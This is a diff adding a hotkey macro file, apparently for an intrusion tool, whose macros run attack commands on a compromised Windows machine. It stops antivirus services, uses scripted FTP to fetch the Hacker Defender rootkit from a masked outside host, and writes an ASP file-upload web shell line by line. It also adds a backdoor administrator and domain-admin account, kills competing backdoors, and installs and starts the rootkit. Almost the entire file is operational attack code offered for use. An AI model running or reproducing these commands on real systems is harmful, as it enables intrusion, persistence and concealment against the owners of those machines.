@@ -1,0 +1,277 @@
+[Macro]
+name=kill_avs
+key=!1
+delay=500
+cmd=net stop Mcshield
+cmd=net stop "Norton Antivirus Service"
+cmd=net stop "Panda Antivirus"
+cmd=net stop "ZoneAlarm"
+cmd=net stop "Detector de OfficeScanNT"
+cmd=net stop "McAfee Framework Service"
+
+[Macro]
+name=upload_FTP
+key=!2
+delay=500
+cmd=echo open xx.xx.xx.xx 1212>a
+cmd=echo ftp>>a
+cmd=echo ftp>>a
+cmd=echo bin>>a
+cmd=echo get hxdef.exe>>a
+cmd=echo get hxdef.ini>>a
+cmd=echo bye>>a
+cmd=start ftp -s:a
+
+[Macro]
+name=Upload_tftp
+key=!3
+delay=500
+cmd=tftp -i blablablabla
+cmd=tftp -i blablablabla
+cmd=tftp -i blablablabla
+
+[Macro]
+name=Upload_ASP
+key=!4
+delay=500
+cmd=echo ^<html^>^<head^>^<title^>upload.asp^</title^>^</head^>^<body^>  >upload.asp
+cmd=echo ^<center^>  >>upload.asp
+cmd=echo ^<form method=post ENCTYPE="multipart/form-data"^>  >>upload.asp
+cmd=echo File to Upload: ^<input type="file" name="File1"^>^<br^>  >>upload.asp
+cmd=echo ^<input type="submit" Name="Action" value="Upload the file"^>  >>upload.asp
+cmd=echo ^</form^>  >>upload.asp
+cmd=echo ^</body^>^</HTML^>  >>upload.asp
+cmd=echo ^<!--#INCLUDE FILE="upload.inc"--^>  >>upload.asp
+cmd=echo ^<%  >>upload.asp
+cmd=echo If Request.ServerVariables("REQUEST_METHOD") = "POST" Then   >>upload.asp
+cmd=echo Set Fields = GetUpload()  >>upload.asp
+cmd=echo FilePath = Server.MapPath(".") ^& "\" ^& Fields("File1").FileName  >>upload.asp
+cmd=echo Fields("File1").Value.SaveAs FilePath  >>upload.asp
+cmd=echo End If  >>upload.asp
+cmd=echo %%^> >>upload.asp
+cmd=@echo UPLOAD.ASP SUCCESSFULLY SENT. NOW SENDING UPLOAD.INC
+cmd=@echo ^<SCRIPT RUNAT=SERVER LANGUAGE=VBSCRIPT^> >>upload.inc
+cmd=@echo Const IncludeType = 2  >>upload.inc
+cmd=@echo Dim UploadSizeLimit >>upload.inc
+cmd=@echo Function GetUpload() >>upload.inc
+cmd=@echo Dim Result >>upload.inc
+cmd=@echo Set Result = Nothing >>upload.inc
+cmd=@echo If Request.ServerVariables("REQUEST_METHOD") = "POST" Then  >>upload.inc
+cmd=@echo Dim CT, PosB, Boundary, Length, PosE >>upload.inc
+cmd=@echo CT = Request.ServerVariables("HTTP_Content_Type")  >>upload.inc
+cmd=@echo If LCase(Left(CT, 19)) = "multipart/form-data" Then  >>upload.inc
+cmd=@echo PosB = InStr(LCase(CT), "boundary=")  >>upload.inc
+cmd=@echo If PosB ^> 0 Then Boundary = Mid(CT, PosB + 9)  >>upload.inc
+cmd=@echo PosB = InStr(LCase(CT), "boundary=")  >>upload.inc
+cmd=@echo If PosB ^> 0 then  >>upload.inc
+cmd=@echo PosB = InStr(Boundary, ",") >>upload.inc
+cmd=@echo If PosB ^> 0 Then Boundary = Left(Boundary, PosB - 1) >>upload.inc
+cmd=@echo end if >>upload.inc
+cmd=@echo Length = CLng(Request.ServerVariables("HTTP_Content_Length"))  >>upload.inc
+cmd=@echo If "" ^& UploadSizeLimit ^<^> "" Then >>upload.inc
+cmd=@echo UploadSizeLimit = CLng(UploadSizeLimit) >>upload.inc
+cmd=@echo If Length ^> UploadSizeLimit Then >>upload.inc
+cmd=@echo Request.BinaryRead (Length) >>upload.inc
+cmd=@echo Err.Raise 2, "GetUpload", "Upload size " ^& FormatNumber(Length, 0) ^& "B exceeds limit of " ^& FormatNumber(UploadSizeLimit, 0) ^& "B" >>upload.inc
+cmd=@echo Exit Function >>upload.inc
+cmd=@echo End If >>upload.inc
+cmd=@echo End If >>upload.inc
+cmd=@echo If Length ^> 0 And Boundary ^<^> "" Then  >>upload.inc
+cmd=@echo Boundary = "--" ^& Boundary >>upload.inc
+cmd=@echo Dim Head, Binary >>upload.inc
+cmd=@echo Binary = Request.BinaryRead(Length)  >>upload.inc
+cmd=@echo Set Result = SeparateFields(Binary, Boundary) >>upload.inc
+cmd=@echo Binary = Empty  >>upload.inc
+cmd=@echo Else >>upload.inc
+cmd=@echo Err.Raise 10, "GetUpload", "Zero length request ." >>upload.inc
+cmd=@echo End If >>upload.inc
+cmd=@echo Else >>upload.inc
+cmd=@echo Err.Raise 11, "GetUpload", "No file sent." >>upload.inc
+cmd=@echo End If >>upload.inc
+cmd=@echo Else >>upload.inc
+cmd=@echo Err.Raise 1, "GetUpload", "Bad request method." >>upload.inc
+cmd=@echo End If >>upload.inc
+cmd=@echo Set GetUpload = Result >>upload.inc
+cmd=@echo End Function >>upload.inc
+cmd=@echo Function SeparateFields(Binary, Boundary) >>upload.inc
+cmd=@echo Dim PosOpenBoundary, PosCloseBoundary, PosEndOfHeader, isLastBoundary >>upload.inc
+cmd=@echo Dim Fields >>upload.inc
+cmd=@echo Boundary = StringToBinary(Boundary) >>upload.inc
+cmd=@echo PosOpenBoundary = InStrB(Binary, Boundary) >>upload.inc
+cmd=@echo PosCloseBoundary = InStrB(PosOpenBoundary + LenB(Boundary), Binary, Boundary, 0) >>upload.inc
+cmd=@echo Set Fields = CreateObject("Scripting.Dictionary") >>upload.inc
+cmd=@echo Do While (PosOpenBoundary ^> 0 And PosCloseBoundary ^> 0 And Not isLastBoundary) >>upload.inc
+cmd=@echo Dim HeaderContent, FieldContent, bFieldContent >>upload.inc
+cmd=@echo Dim Content_Disposition, FormFieldName, SourceFileName, Content_Type >>upload.inc
+cmd=@echo Dim Field, TwoCharsAfterEndBoundary >>upload.inc
+cmd=@echo PosEndOfHeader = InStrB(PosOpenBoundary + Len(Boundary), Binary, StringToBinary(vbCrLf + vbCrLf)) >>upload.inc
+cmd=@echo HeaderContent = MidB(Binary, PosOpenBoundary + LenB(Boundary) + 2, PosEndOfHeader - PosOpenBoundary - LenB(Boundary) - 2) >>upload.inc
+cmd=@echo bFieldContent = MidB(Binary, (PosEndOfHeader + 4), PosCloseBoundary - (PosEndOfHeader + 4) - 2) >>upload.inc
+cmd=@echo GetHeadFields BinaryToString(HeaderContent), Content_Disposition, FormFieldName, SourceFileName, Content_Type >>upload.inc
+cmd=@echo Set Field = CreateUploadField()  >>upload.inc
+cmd=@echo Set FieldContent = CreateBinaryData() >>upload.inc
+cmd=@echo FieldContent.ByteArray = bFieldContent >>upload.inc
+cmd=@echo FieldContent.Length = LenB(bFieldContent) >>upload.inc
+cmd=@echo Field.Name = FormFieldName >>upload.inc
+cmd=@echo Field.ContentDisposition = Content_Disposition >>upload.inc
+cmd=@echo Field.FilePath = SourceFileName >>upload.inc
+cmd=@echo Field.FileName = GetFileName(SourceFileName) >>upload.inc
+cmd=@echo Field.ContentType = Content_Type >>upload.inc
+cmd=@echo Field.Length = FieldContent.Length >>upload.inc
+cmd=@echo Set Field.Value = FieldContent >>upload.inc
+cmd=@echo Fields.Add FormFieldName, Field >>upload.inc
+cmd=@echo TwoCharsAfterEndBoundary = BinaryToString(MidB(Binary, PosCloseBoundary + LenB(Boundary), 2)) >>upload.inc
+cmd=@echo isLastBoundary = TwoCharsAfterEndBoundary = "--" >>upload.inc
+cmd=@echo If Not isLastBoundary Then  >>upload.inc
+cmd=@echo PosOpenBoundary = PosCloseBoundary >>upload.inc
+cmd=@echo PosCloseBoundary = InStrB(PosOpenBoundary + LenB(Boundary), Binary, Boundary) >>upload.inc
+cmd=@echo End If >>upload.inc
+cmd=@echo Loop >>upload.inc
+cmd=@echo Set SeparateFields = Fields >>upload.inc
+cmd=@echo End Function >>upload.inc
+cmd=@echo Function GetHeadFields(ByVal Head, Content_Disposition, Name, FileName, Content_Type) >>upload.inc
+cmd=@echo Content_Disposition = LTrim(SeparateField(Head, "content-disposition:", ";")) >>upload.inc
+cmd=@echo Name = (SeparateField(Head, "name=", ";"))  >>upload.inc
+cmd=@echo If Left(Name, 1) = """" Then Name = Mid(Name, 2, Len(Name) - 2) >>upload.inc
+cmd=@echo FileName = (SeparateField(Head, "filename=", ";"))  >>upload.inc
+cmd=@echo If Left(FileName, 1) = """" Then FileName = Mid(FileName, 2, Len(FileName) - 2) >>upload.inc
+cmd=@echo Content_Type = LTrim(SeparateField(Head, "content-type:", ";")) >>upload.inc
+cmd=@echo End Function >>upload.inc
+cmd=@echo Function SeparateField(From, ByVal sStart, ByVal sEnd) >>upload.inc
+cmd=@echo Dim PosB, PosE, sFrom >>upload.inc
+cmd=@echo sFrom = LCase(From) >>upload.inc
+cmd=@echo PosB = InStr(sFrom, sStart) >>upload.inc
+cmd=@echo If PosB ^> 0 Then >>upload.inc
+cmd=@echo PosB = PosB + Len(sStart) >>upload.inc
+cmd=@echo PosE = InStr(PosB, sFrom, sEnd) >>upload.inc
+cmd=@echo If PosE = 0 Then PosE = InStr(PosB, sFrom, vbCrLf) >>upload.inc
+cmd=@echo If PosE = 0 Then PosE = Len(sFrom) + 1 >>upload.inc
+cmd=@echo SeparateField = Mid(From, PosB, PosE - PosB) >>upload.inc
+cmd=@echo Else >>upload.inc
+cmd=@echo SeparateField = Empty >>upload.inc
+cmd=@echo End If >>upload.inc
+cmd=@echo End Function >>upload.inc
+cmd=@echo Function GetFileName(FullPath) >>upload.inc
+cmd=@echo Dim Pos, PosF >>upload.inc
+cmd=@echo PosF = 0 >>upload.inc
+cmd=@echo For Pos = Len(FullPath) To 1 Step -1 >>upload.inc
+cmd=@echo Select Case Mid(FullPath, Pos, 1) >>upload.inc
+cmd=@echo Case "/", "\": PosF = Pos + 1: Pos = 0 >>upload.inc
+cmd=@echo End Select >>upload.inc
+cmd=@echo Next >>upload.inc
+cmd=@echo If PosF = 0 Then PosF = 1 >>upload.inc
+cmd=@echo GetFileName = Mid(FullPath, PosF) >>upload.inc
+cmd=@echo End Function >>upload.inc
+cmd=@echo Function BinaryToString(Binary) >>upload.inc
+cmd=@echo dim cl1, cl2, cl3, pl1, pl2, pl3 >>upload.inc
+cmd=@echo Dim L >>upload.inc
+cmd=@echo cl1 = 1 >>upload.inc
+cmd=@echo cl2 = 1 >>upload.inc
+cmd=@echo cl3 = 1 >>upload.inc
+cmd=@echo L = LenB(Binary) >>upload.inc
+cmd=@echo Do While cl1^<=L >>upload.inc
+cmd=@echo pl3 = pl3 ^& Chr(AscB(MidB(Binary,cl1,1))) >>upload.inc
+cmd=@echo cl1 = cl1 + 1 >>upload.inc
+cmd=@echo cl3 = cl3 + 1 >>upload.inc
+cmd=@echo if cl3^>300 then >>upload.inc
+cmd=@echo pl2 = pl2 ^& pl3 >>upload.inc
+cmd=@echo pl3 = "" >>upload.inc
+cmd=@echo cl3 = 1 >>upload.inc
+cmd=@echo cl2 = cl2 + 1 >>upload.inc
+cmd=@echo if cl2^>200 then >>upload.inc
+cmd=@echo pl1 = pl1 ^& pl2 >>upload.inc
+cmd=@echo pl2 = "" >>upload.inc
+cmd=@echo cl2 = 1 >>upload.inc
+cmd=@echo End If >>upload.inc
+cmd=@echo End If >>upload.inc
+cmd=@echo Loop >>upload.inc
+cmd=@echo BinaryToString = pl1 ^& pl2 ^& pl3 >>upload.inc
+cmd=@echo End Function >>upload.inc
+cmd=@echo Function BinaryToStringold(Binary) >>upload.inc
+cmd=@echo Dim I, S >>upload.inc
+cmd=@echo For I = 1 To LenB(Binary) >>upload.inc
+cmd=@echo S = S ^& Chr(AscB(MidB(Binary, I, 1))) >>upload.inc
+cmd=@echo Next >>upload.inc
+cmd=@echo BinaryToString = S >>upload.inc
+cmd=@echo End Function >>upload.inc
+cmd=@echo Function StringToBinary(String) >>upload.inc
+cmd=@echo Dim I, B >>upload.inc
+cmd=@echo For I=1 to len(String) >>upload.inc
+cmd=@echo B = B ^& ChrB(Asc(Mid(String,I,1))) >>upload.inc
+cmd=@echo Next >>upload.inc
+cmd=@echo StringToBinary = B >>upload.inc
+cmd=@echo End Function >>upload.inc
+cmd=@echo Function vbsSaveAs(FileName, ByteArray) >>upload.inc
+cmd=@echo Dim FS, TextStream>>upload.inc
+cmd=@echo Set FS = CreateObject("Scripting.FileSystemObject") >>upload.inc
+cmd=@echo Set TextStream = FS.CreateTextFile(FileName) >>upload.inc
+cmd=@echo TextStream.Write BinaryToString(ByteArray)  >>upload.inc
+cmd=@echo TextStream.Close >>upload.inc
+cmd=@echo End Function >>upload.inc
+cmd=@echo ^</SCRIPT^> >>upload.inc
+cmd=@echo ^<SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT^> >>upload.inc
+cmd=@echo function CreateUploadField(){ return new uf_Init() } >>upload.inc
+cmd=@echo function uf_Init(){ >>upload.inc
+cmd=@echo this.Name = null >>upload.inc
+cmd=@echo this.ContentDisposition = null >>upload.inc
+cmd=@echo this.FileName = null >>upload.inc
+cmd=@echo this.FilePath = null >>upload.inc
+cmd=@echo this.ContentType = null >>upload.inc
+cmd=@echo this.Value = null >>upload.inc
+cmd=@echo this.Length = null >>upload.inc
+cmd=@echo } >>upload.inc
+cmd=@echo function CreateBinaryData(){ return new bin_Init() } >>upload.inc
+cmd=@echo function bin_Init(){ >>upload.inc
+cmd=@echo this.ByteArray = null >>upload.inc
+cmd=@echo this.Length = null >>upload.inc
+cmd=@echo this.String = jsBinaryToString >>upload.inc
+cmd=@echo this.SaveAs = jsSaveAs >>upload.inc
+cmd=@echo } >>upload.inc
+cmd=@echo function jsBinaryToString(){ >>upload.inc
+cmd=@echo return BinaryToString(this.ByteArray) >>upload.inc
+cmd=@echo } >>upload.inc
+cmd=@echo function jsSaveAs(FileName){ >>upload.inc
+cmd=@echo return vbsSaveAs(FileName, this.ByteArray) >>upload.inc
+cmd=@echo } >>upload.inc
+cmd=@echo ^</SCRIPT^>>>upload.inc
+
+
+[Macro]
+name=Adduser
+key=!5
+delay=500
+cmd=net user SUPPORT_3569a74r KaHTSecuritycheck/add
+cmd=net localgroup Administradores SUPPORT_3569a74r /add
+cmd=net localgroup Administrators SUPPORT_3569a74r /add
+cmd=net group "Domain Admins" SUPPORT_3569a74r /add
+
+[Macro]
+name=Killhax0rs
+key=!6
+delay=500
+cmd=net stop serv-u
+cmd=net stop r_server
+cmd=net stop "DAmeware 2.6"
+cmd=net stop "RA Server"
+cmd=net stop firedaemon....
+
+[Macro]
+name=upload_FTP
+key=!9
+delay=300
+cmd=echo open xx.xx.xxx.xx 1212>a
+cmd=echo ftp>>a
+cmd=echo ftp>>a
+cmd=echo bin>>a
+cmd=echo get hxdef.exe>>a
+cmd=echo get hxdef.ini>>a
+cmd=echo bye>>a
+cmd=ftp -s:a
+delay=5000
+cmd=dir c:\ /a
+cmd=dir d:\ /a
+cmd=dir e:\ /a
+cmd=hxdef.exe -:installonly
+cmd=del a
+cmd=net start hackerdefender
+
